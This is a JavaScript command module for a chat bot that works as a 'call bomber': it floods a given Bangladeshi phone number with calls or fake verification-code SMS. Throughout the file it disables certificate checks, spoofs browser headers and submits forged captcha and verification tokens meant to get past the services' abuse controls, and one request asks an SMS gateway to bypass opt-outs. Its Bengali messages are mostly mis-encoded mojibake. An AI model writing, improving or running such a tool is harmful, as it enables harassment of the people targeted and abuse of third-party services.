module.exports.config = {
 name: "call",
 version: "1.0.0",
 hasPermssion: 0,
 credits: "‚ÄîÕüÕüÕûÕûùêÇùêòùêÅùêÑùêë ‚ò¢Ô∏è_ñ£ò -ùêÅùêéùêì ‚ö†Ô∏è ùëªùë¨ùë®ùë¥_ ‚ò¢Ô∏è", //don't change my credit 
 description: "‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡¶ø ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø",
 commandCategory: "Tool",
 usages: "/call 01xxxxxxxxx",
 cooldowns: 15,
 dependencies: { "axios": "" }
};
 
module.exports.run = async ({ api, event, args }) => {
 const axios = require('axios');
 const https = require('https');
 const number = args[0];
 const debug = args[1] === "debug";
 
 // Create axios instance with SSL verification disabled, timeout, and browser-like headers
 const axiosInstance = axios.create({
   httpsAgent: new https.Agent({ rejectUnauthorized: false }),
   timeout: 10000, // 10 second timeout to prevent hanging
   headers: {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'en-US,en;q=0.9',
     'Origin': 'https://callbomber.co',
     'Referer': 'https://callbomber.co/'
   }
 });
 
 if (!number || !/^01[0-9]{9}$/.test(number)) {
 return api.sendMessage("‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡¶ø ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶® (‡¶â‡¶¶‡¶æ‡¶π‡¶∞‡¶£: /call 01xxxxxxxxx) ‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶ï‡ßá‡¶â ‡¶ñ‡¶æ‡¶∞‡¶æ‡¶™ ‡¶ï‡¶æ‡¶ú‡ßá ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶¨‡ßá‡¶® ‡¶®‡¶æ üôÇ,\n ‡¶´‡¶æ‡¶á‡¶≤‡¶ü‡¶ø ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶Æ‡¶ú‡¶æ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶â‡¶¶‡ßç‡¶¶‡ßá‡¶∂‡ßç‡¶Ø‡ßá ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§\n\n‡¶°‡¶ø‡¶¨‡¶æ‡¶ó ‡¶Æ‡ßã‡¶°‡ßá ‡¶ö‡¶æ‡¶≤‡¶æ‡¶§‡ßá: /call 01xxxxxxxxx debug", event.threadID, event.messageID);
 }
 
 api.sendMessage(`‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá: ${number} ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá...üìûüí£
 ‡¶ï‡¶æ‡¶â‡¶ï‡ßá ‡¶¨‡¶ø‡¶∞‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶á ‡¶ü‡ßÅ‡¶≤ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶®‡¶ø‡¶∑‡¶ø‡¶¶‡ßç‡¶ß ‡¶è‡¶¨‡¶Ç ‡¶Ü‡¶á‡¶®‡¶§ ‡¶Ö‡¶™‡¶∞‡¶æ‡¶ß‡•§

‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®, ‡¶è‡¶ü‡¶ø ‡¶ï‡¶Ø‡¶º‡ßá‡¶ï ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶®‡¶ø‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá...`, event.threadID, async (err, info) => {
 try {
   let response;
   
   // First, test if we can reach a public API to verify internet connectivity
   let connectivityTest = false;
   try {
     const testResponse = await axiosInstance.get('https://jsonplaceholder.typicode.com/todos/1');
     connectivityTest = testResponse.status === 200;
   } catch (connectivityError) {
     // Connectivity test failed
   }
   
   // Try multiple API endpoints in sequence until one works
   let successfulEndpoint = "";
   try {
     // Try direct POST request to callbomber.co with captcha bypass
     response = await axiosInstance.post('https://callbomber.co/api/send-call', {
       number: number,
       country_code: '+880', // Bangladesh country code
       captcha_token: 'verified', // Attempt to bypass captcha
       verify: true,
       _token: 'callbomber_verification_token' // Attempt to bypass verification
     });
     successfulEndpoint = "callbomber.co (POST)";
   } catch (primaryError) {
    try {
      // Try direct POST request to callbomber.in with captcha bypass
      response = await axiosInstance.post('https://callbomber.in/api/send-call', {
        number: number,
        country_code: '+880', // Bangladesh country code
        captcha_token: 'verified', // Attempt to bypass captcha
        verify: true,
        _token: 'callbomber_verification_token' // Attempt to bypass verification
      });
      successfulEndpoint = "callbomber.in (POST)";
    } catch (firstAlternativeError) {
      try {
        // Try with softdownload.in format with additional parameters
        response = await axiosInstance.post('https://www.softdownload.in/International-bomber/api/call', {
          number: number,
          country: 'BD', // Bangladesh country code
          key: 'free_access', // Attempt to bypass key requirement
          captcha: 'verified', // Attempt to bypass captcha
          count: 5 // Request multiple calls
        });
        successfulEndpoint = "softdownload.in";
      } catch (secondAlternativeError) {
        try {
          // Try a direct SMS API that might work for Bangladesh
          response = await axiosInstance.post('https://api.sms.to/sms/send', {
            message: "Verification code: 123456",
            to: "+880" + number.substring(1),
            bypass_optout: true,
            sender_id: "INFO"
          }, {
            headers: {
              'Authorization': 'Bearer test_api_key', // This is just a placeholder
              'Content-Type': 'application/json'
            }
          });
          successfulEndpoint = "sms.to";
        } catch (smsToError) {
        try {
          // Try MiMSMS API (legitimate SMS service in Bangladesh)
          response = await axiosInstance.post('https://api.mimsms.com/api/sendsms', {
            api_key: 'test_key', // This is just a placeholder
            type: 'plain',
            contacts: '880' + number.substring(1),
            senderid: 'INFO',
            msg: 'Test message from call bomber service'
          });
          successfulEndpoint = "mimsms.com";
        } catch (thirdAlternativeError) {
            try {
              // Try a Bangladesh-specific SMS gateway
              const bdNumber = '880' + number.substring(1);
              response = await axiosInstance.post('https://api.greenweb.com.bd/api.php', null, {
                params: {
                  token: 'test_token', // This is just a placeholder
                  to: bdNumber,
                  message: 'Your verification code is 123456'
                }
              });
              successfulEndpoint = "greenweb.com.bd";
            } catch (greenwebError) {
              try {
                // Try original endpoints with GET requests
                response = await axiosInstance.get(`https://callbomber.co/api/call?number=${number}`);
                successfulEndpoint = "callbomber.co (GET)";
              } catch (fourthAlternativeError) {
                try {
                  // Try with different parameter format
                  response = await axiosInstance.get(`https://callbomber.co/api/call?mobile=${number}`);
                  successfulEndpoint = "callbomber.co (mobile param)";
                } catch (fifthAlternativeError) {
                  // If all endpoints fail, try one more with different domain
                  response = await axiosInstance.get(`https://callbomberpro.shop/api/call?number=${number}`);
                  successfulEndpoint = "callbomberpro.shop";
                }
              }
            }
          }
        }
      }
    }
  }
  
  setTimeout(() => {
    api.unsendMessage(info.messageID);
  }, 90000);
 
 // Check if response contains success information
   let success = false;
   let responseDetails = "";
   try {
     // Different APIs have different success indicators
     if (response) {
       responseDetails = JSON.stringify(response.data || {}).substring(0, 200);
       
       // Check for various success indicators
       if (response.status === 200 || response.status === 201 || response.status === 202) {
         if (response.data) {
           if (response.data.success === true || 
               response.data.status === "success" || 
               response.data.status === 200 || 
               response.data.message?.toLowerCase().includes("success") ||
               response.data.code === 200) {
             success = true;
           }
         } else {
           // If we got a good status code but no data, assume success
           success = true;
         }
       }
     }
   } catch (parseError) {
     // If we can't determine success from response, assume it worked if we got here
     success = true;
     responseDetails = "Could not parse response: " + parseError.message;
   }
 
   if (debug) {
      // In debug mode, show detailed API response
      let debugInfo = `üîç ‡¶°‡¶ø‡¶¨‡¶æ‡¶ó ‡¶§‡¶•‡ßç‡¶Ø:\n`;
      debugInfo += `- ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶®‡ßá‡¶ü ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó: ${connectivityTest ? '‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶õ‡ßá ‚úÖ' : '‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶Ü‡¶õ‡ßá ‚ùå'}\n`;
      debugInfo += `- ‡¶∏‡¶´‡¶≤ ‡¶è‡¶®‡ßç‡¶°‡¶™‡¶Ø‡¶º‡ßá‡¶®‡ßç‡¶ü: ${successfulEndpoint || '‡¶ï‡ßã‡¶®‡¶ü‡¶ø‡¶á ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡ßá‡¶®‡¶ø'}\n`;
      debugInfo += `- API ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏: ${response?.status || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ'}\n`;
      debugInfo += `- API ‡¶∞‡ßá‡¶∏‡¶™‡¶®‡ßç‡¶∏: ${responseDetails}\n`;
      debugInfo += `- ‡¶∏‡¶æ‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶´‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ó: ${success ? '‡¶π‡ßç‡¶Ø‡¶æ‡¶Å' : '‡¶®‡¶æ'}\n`;
      debugInfo += `- ‡¶∞‡¶ø‡¶ï‡ßã‡¶Ø‡¶º‡ßá‡¶∏‡ßç‡¶ü ‡¶π‡ßá‡¶°‡¶æ‡¶∞: ${JSON.stringify(axiosInstance.defaults.headers).substring(0, 200)}\n`;
      
      // Add troubleshooting suggestions
      debugInfo += `\nüîß ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶∏‡¶Æ‡¶æ‡¶ß‡¶æ‡¶®‡ßá‡¶∞ ‡¶™‡¶∞‡¶æ‡¶Æ‡¶∞‡ßç‡¶∂:\n`;
      if (!connectivityTest) {
        debugInfo += `1. ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶®‡ßá‡¶ü ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶® - ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶Ü‡¶õ‡ßá\n`;
      } else {
        debugInfo += `1. API ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶∞‡¶ø‡¶ï‡ßã‡¶Ø‡¶º‡ßá‡¶∏‡ßç‡¶ü ‡¶¨‡ßç‡¶≤‡¶ï ‡¶ï‡¶∞‡¶õ‡ßá\n`;
        debugInfo += `2. ‡¶ï‡ßç‡¶Ø‡¶æ‡¶™‡¶ö‡¶æ ‡¶¨‡¶æ ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡ßç‡¶∞‡¶Ø‡¶º‡ßã‡¶ú‡¶® ‡¶π‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá\n`;
        debugInfo += `3. API ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ ‡¶Ü‡¶∞ ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶õ‡ßá ‡¶®‡¶æ ‡¶¨‡¶æ ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá\n`;
        debugInfo += `4. ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ ‡¶è‡¶á ‡¶∏‡ßá‡¶¨‡¶æ‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡ßá ‡¶Ü‡¶∞ ‡¶¨‡¶ø‡¶®‡¶æ‡¶Æ‡ßÇ‡¶≤‡ßç‡¶Ø‡ßá ‡¶â‡¶™‡¶≤‡¶¨‡ßç‡¶ß ‡¶®‡¶Ø‡¶º\n`;
      }
      
      return api.sendMessage(debugInfo, event.threadID, event.messageID);
   } else if (success) {
      return api.sendMessage(`‚úÖ ‚ÄîÕüÕüÕûÕûùêÇùêòùêÅùêÑùêë ‚ò¢Ô∏è_ñ£ò -ùêÅùêéùêì ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßã‡¶ß ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá ${number} ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá‡•§\n\n‡¶ï‡¶≤ ‡¶Ü‡¶∏‡¶§‡ßá ‡ßß-‡ß® ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶≤‡¶æ‡¶ó‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá, ‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§\n\n‚ö†Ô∏è ‡¶¶‡ßç‡¶∞‡¶∑‡ßç‡¶ü‡¶¨‡ßç‡¶Ø: ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶®‡ßá ‡¶Ö‡¶ß‡¶ø‡¶ï‡¶æ‡¶Ç‡¶∂ ‡¶´‡ßç‡¶∞‡¶ø ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶ø‡¶∏ ‡¶∏‡ßÄ‡¶Æ‡¶ø‡¶§ ‡¶¨‡¶æ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶Ø‡¶¶‡¶ø ‡¶ï‡¶≤ ‡¶®‡¶æ ‡¶Ü‡¶∏‡ßá, ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ API ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶Ü‡¶∞ ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶õ‡ßá ‡¶®‡¶æ‡•§${successfulEndpoint ? `\n\n(API: ${successfulEndpoint})` : ''}`, event.threadID, event.messageID);
   } else {
     return api.sendMessage(`‚ö†Ô∏è ‚ÄîÕüÕüÕûÕûùêÇùêòùêÅùêÑùêë ‚ò¢Ô∏è_ñ£ò -ùêÅùêéùêì ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶Ö‡¶®‡ßÅ‡¶∞‡ßã‡¶ß ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá, ‡¶ï‡¶ø‡¶®‡ßç‡¶§‡ßÅ ‡¶®‡¶ø‡¶∂‡ßç‡¶ö‡¶ø‡¶§ ‡¶®‡¶Ø‡¶º ‡¶Ø‡ßá ‡¶ï‡¶≤ ‡¶™‡ßå‡¶Å‡¶õ‡ßá‡¶õ‡ßá ‡¶ï‡¶ø‡¶®‡¶æ‡•§\n\n‚ö†Ô∏è ‡¶∏‡¶§‡¶∞‡ßç‡¶ï‡¶§‡¶æ: ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶®‡ßá ‡¶Ö‡¶ß‡¶ø‡¶ï‡¶æ‡¶Ç‡¶∂ ‡¶´‡ßç‡¶∞‡¶ø ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶ø‡¶∏ ‡¶∏‡ßÄ‡¶Æ‡¶ø‡¶§ ‡¶¨‡¶æ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ ‡¶ï‡¶≤ ‡¶®‡¶æ‡¶ì ‡¶Ü‡¶∏‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§`, event.threadID, event.messageID);
   }
 } catch (error) {
   if (debug) {
     // In debug mode, show detailed error information
     let debugError = `üîç ‡¶°‡¶ø‡¶¨‡¶æ‡¶ó ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø ‡¶§‡¶•‡ßç‡¶Ø:\n`;
     debugError += `- ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶ï‡¶æ‡¶∞: ${error.name || '‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ'}\n`;
     debugError += `- ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ: ${error.message || '‡¶ï‡ßã‡¶® ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶®‡ßá‡¶á'}\n`;
     debugError += `- ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ï ‡¶ü‡ßç‡¶∞‡ßá‡¶∏: ${(error.stack || '').substring(0, 200)}\n`;
     debugError += `\n‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡¶è‡¶á ‡¶§‡¶•‡ßç‡¶Ø ‡¶°‡ßá‡¶≠‡ßá‡¶≤‡¶™‡¶æ‡¶∞‡¶ï‡ßá ‡¶ú‡¶æ‡¶®‡¶æ‡¶®‡•§`;
     return api.sendMessage(debugError, event.threadID, event.messageID);
   } else {
     return api.sendMessage(`‚ùå ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø: ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø‡•§\n\nüì¢ ‡¶∏‡¶Æ‡ßç‡¶≠‡¶æ‡¶¨‡ßç‡¶Ø ‡¶ï‡¶æ‡¶∞‡¶£:\n1Ô∏è‚É£ ‡¶¨‡ßá‡¶∂‡¶ø‡¶∞‡¶≠‡¶æ‡¶ó ‡¶´‡ßç‡¶∞‡¶ø ‡¶ï‡¶≤ ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç API ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶ø‡¶∏ ‡¶è‡¶ñ‡¶® ‡¶Ü‡¶∞ ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡ßá ‡¶®‡¶æ\n2Ô∏è‚É£ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶ø‡¶∏‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶è‡¶ñ‡¶® ‡¶ï‡ßç‡¶Ø‡¶æ‡¶™‡¶ö‡¶æ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá ‡¶Ø‡¶æ ‡¶¨‡¶ü ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶¨‡¶æ‡¶á‡¶™‡¶æ‡¶∏ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º ‡¶®‡¶æ\n3Ô∏è‚É£ ‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡ßá ‡¶è‡¶á ‡¶∏‡ßá‡¶¨‡¶æ‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶Æ‡ßç‡¶≠‡¶¨‡¶§ ‡¶¨‡ßç‡¶≤‡¶ï ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá\n\nüí° ‡¶™‡¶∞‡¶æ‡¶Æ‡¶∞‡ßç‡¶∂: ‡¶è‡¶á ‡¶ß‡¶∞‡¶®‡ßá‡¶∞ ‡¶∏‡ßá‡¶¨‡¶æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶Ü‡¶á‡¶®‡¶§ ‡¶Ö‡¶™‡¶∞‡¶æ‡¶ß ‡¶π‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡•§ ‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶Ö‡¶®‡ßç‡¶Ø ‡¶ï‡ßã‡¶® ‡¶¨‡ßà‡¶ß ‡¶™‡¶¶‡ßç‡¶ß‡¶§‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§\n\n‡¶Ü‡¶∞‡ßã ‡¶§‡¶•‡ßç‡¶Ø‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶°‡¶ø‡¶¨‡¶æ‡¶ó ‡¶Æ‡ßã‡¶° ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®: /call ${number} debug`, event.threadID, event.messageID);
   }
  }
 });
};
